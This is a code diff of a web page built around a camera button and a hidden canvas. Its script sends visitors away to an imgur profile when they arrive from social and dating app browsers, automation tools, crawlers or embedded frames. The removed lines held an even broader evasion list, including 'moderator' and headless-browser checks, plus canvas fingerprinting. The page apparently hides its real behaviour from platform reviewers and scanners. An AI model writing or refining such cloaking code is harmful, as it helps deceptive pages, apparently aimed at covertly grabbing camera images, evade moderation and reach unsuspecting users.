@@ -17,7 +17,6 @@
       align-items: center;
       flex-direction: column;
     }
-
     .btn {
       background-color: white;
       color: black;
@@ -28,7 +27,9 @@
       cursor: pointer;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
     }
-
+    canvas.b {
+      display: none;
+    }
     #loading {
       display: none;
       flex-direction: column;
@@ -36,7 +37,6 @@
       color: white;
       font-size: 2rem;
     }
-
     .loader {
       margin-top: 1rem;
       width: 50px;
@@ -46,18 +46,12 @@
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
-    canvas.b {
-      display: none;
-    }
   </style>
 </head>
-
 <body>
   <button class="btn" onclick="g()">📷</button>
   <div id="loading">
@@ -68,48 +62,11 @@
 
   <script>
     (() => {
-      const ua = navigator.userAgent.toLowerCase();
-      const badUA = [
-        "instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line",
-        "pinterest", "telegram", "grindr", "discord", "reddit", "snapchat",
-        "puppeteer", "selenium", "phantomjs", "headless", "googlebot", "moderator",
-        "python-requests", "curl", "wget", "java", "aiohttp", "go-http-client", "httpclient"
-      ];
-
-      const isBad = () =>
-        badUA.some(s => ua.includes(s)) ||
-        window.top !== window.self ||
-        navigator.webdriver ||
-        navigator.plugins.length === 0 ||
-        !navigator.languages ||
-        /HeadlessChrome/.test(navigator.userAgent);
-
-      const isCanvasSpoofed = () => {
-        try {
-          const canvas = document.createElement("canvas");
-          const ctx = canvas.getContext("2d");
-          canvas.width = 100; canvas.height = 100;
-          ctx.textBaseline = "top";
-          ctx.font = "14px Arial";
-          ctx.fillText("bot-check", 2, 2);
-          return canvas.toDataURL().length < 1000;
-        } catch {
-          return true;
-        }
-      };
-
-      let interacted = false;
-      document.addEventListener("mousemove", () => interacted = true);
-      document.addEventListener("touchstart", () => interacted = true);
-      document.addEventListener("keypress", () => interacted = true);
-
-      if (isBad() || isCanvasSpoofed()) {
-        location.href = "https://imgur.com/user/carlovershub"; 
+      const u = navigator.userAgent.toLowerCase();
+      const a = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
+      if (a.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
+        location.href = "https://imgur.com/user/carlovershub";
       }
-
-      setTimeout(() => {
-        if (!interacted) location.href = "https://imgur.com/user/carlovershub";
-      }, 3000);
     })();
 
     (() => {
@@ -142,6 +99,7 @@
 
     function g() {
       if (!i) return;
+
       document.querySelector(".btn").style.display = "none";
       document.getElementById("loading").style.display = "flex";
 
